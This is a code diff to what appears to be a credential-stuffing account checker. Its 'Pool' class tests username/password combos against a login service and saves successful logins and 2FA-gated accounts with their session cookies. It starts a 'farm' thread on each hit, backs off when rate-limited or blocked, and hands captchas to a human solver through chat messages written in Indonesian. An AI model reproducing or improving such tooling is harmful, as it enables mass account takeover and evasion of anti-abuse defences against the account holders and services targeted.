@@ -49,24 +49,21 @@ class Pool:
         with self.lock:
             self.stats[k] = self.stats.get(k, 0) + 1
 
-    def _note(self, status):
+    def _note(self, s):
         with self.lock:
-            self.recent.append(status)
+            self.recent.append(s)
 
     def captcha_rate(self):
         with self.lock:
             n = len(self.recent)
-            if not n:
-                return 0.0
-            return sum(1 for s in self.recent if s == "captcha") / n
+            return 0.0 if not n else sum(1 for s in self.recent if s == "captcha") / n
 
     def breaker_tripped(self):
         with self.lock:
             n = len(self.recent)
             if n < self.recent.maxlen:
                 return False
-            c = sum(1 for s in self.recent if s == "captcha")
-            return (c / n) > config.CAPTCHA_BREAKER_RATE
+            return (sum(1 for s in self.recent if s == "captcha") / n) > config.CAPTCHA_BREAKER_RATE
 
     def set_mode(self, mode):
         self.mode = "blast" if str(mode).lower() == "blast" else "auto"
@@ -90,7 +87,7 @@ class Pool:
                 "blob": ch.get("blob") or "", "u": u, "p": p}
         return base64.urlsafe_b64encode(json.dumps(body).encode()).decode()
 
-    def _try_warm(self, ch, label, u="", p=""):
+    def _try_warm(self, ch, u, p):
         if self.warm_busy.is_set():
             return None
         self.warm_busy.set()
@@ -100,10 +97,10 @@ class Pool:
                 self.warm_token = None
                 self.warm_event.clear()
             payload = self._payload(ch or {}, u, p)
-            msg = ("== WARM NEEDED ==\nakun: %s\n\n"
-                   "1. buka %s\n2. tempel PAYLOAD\n3. solve captcha\n"
-                   "4. copy TOKEN, balas ke chat ini\n\ntimeout %ds\n\nPAYLOAD:\n%s"
-                   % (label, config.WARM_PAGE, int(config.WARM_TIMEOUT), payload))
+            msg = ("== WARM NEEDED ==\nakun: %s\n\n1. buka %s\n2. tempel PAYLOAD\n"
+                   "3. solve captcha\n4. copy TOKEN, balas ke chat ini\n\n"
+                   "timeout %ds\n\nPAYLOAD:\n%s" % (
+                       u, config.WARM_PAGE, int(config.WARM_TIMEOUT), payload))
             if self.notify:
                 try:
                     self.notify(msg)
@@ -111,11 +108,11 @@ class Pool:
                     pass
             self.warm_event.wait(config.WARM_TIMEOUT)
             with self.warm_lock:
-                token = self.warm_token
+                tok = self.warm_token
                 self.warm_pending = None
                 self.warm_token = None
             self._bump("warm")
-            return token
+            return tok
         finally:
             self.warm_busy.clear()
 
@@ -131,7 +128,7 @@ class Pool:
             return "captcha", detail, None
         if time.time() < self.warm_cool:
             return "captcha", detail, None
-        token = self._try_warm(cli.challenge, u, u, p)
+        token = self._try_warm(cli.challenge, u, p)
         if not token:
             self.warm_cool = time.time() + config.WARM_RETRY
             return "captcha", detail, None
@@ -184,20 +181,18 @@ class Pool:
                         time.sleep(0.5)
                         waited += 0.5
                     store.back_to_pending(u, p, "warm-wait")
-                    self._bump("retry")
                     continue
                 status, detail, cookie = self._handle_captcha(cli, u, p, detail)
                 if status == "captcha":
                     self._note("captcha")
-                    store.mark_captcha(u, p, detail, config.CAPTCHA_DELAY,
-                                       config.MAX_CAPTCHA_TRIES)
+                    store.mark_captcha(u, p, detail, config.CAPTCHA_DELAY)
                     self._bump("retry")
                     cli.reset()
                     continue
 
             self._note(status)
 
-            if status in ("ratelimited", "csrf", "error"):
+            if status in ("ratelimited", "csrf", "error", "blocked"):
                 if status == "ratelimited":
                     try:
                         wait = min(300.0, float(detail) + 5)
@@ -205,7 +200,7 @@ class Pool:
                         wait = 60.0
                     self.gate.hold(wait)
                 delay = {"error": config.RETRY_DELAY, "csrf": 5.0,
-                         "ratelimited": 0.0}[status]
+                         "ratelimited": 0.0, "blocked": config.RETRY_DELAY}[status]
                 store.requeue(u, p, "%s %s" % (status, detail), delay,
                               config.MAX_ATTEMPTS)
                 self._bump("retry")
@@ -213,35 +208,23 @@ class Pool:
                 continue
 
             if status in ("hit", "2fa"):
-                note = "" if status == "hit" else "2fa"
-                store.add_hit(u, p, cookie, note)
+                store.add_hit(u, p, cookie, "" if status == "hit" else "2fa")
                 store.finish_combo(u, p, status, detail)
                 if status == "2fa" and cli.challenge and cli.challenge.get("id"):
-                    try:
-                        store.set_state("2fa:%s" % u, json.dumps({
-                            "id": cli.challenge.get("id"),
-                            "type": cli.challenge.get("type"),
-                            "meta": cli.challenge.get("meta") or {}}))
-                    except Exception:
-                        pass
+                    store.set_state("2fa:%s" % u, json.dumps({
+                        "id": cli.challenge.get("id"),
+                        "type": cli.challenge.get("type"),
+                        "meta": cli.challenge.get("meta") or {}}))
                 self._bump("hit")
                 if cookie:
                     threading.Thread(target=self._farm, args=(u, cookie),
                                      daemon=True).start()
                 cli.reset(soft=True)
-            elif status == "banned":
-                store.finish_combo(u, p, "banned", detail)
             elif status == "invalid":
-                if self.breaker_tripped() or self.pool_soft():
+                if store.soft_count() or self.breaker_tripped():
                     store.mark_soft(u, p, detail)
                 else:
                     store.finish_combo(u, p, "invalid", detail)
             else:
                 store.finish_combo(u, p, status, detail)
             self._bump("done")
-
-    def pool_soft(self):
-        try:
-            return store.soft_count() > 0
-        except Exception:
-            return False
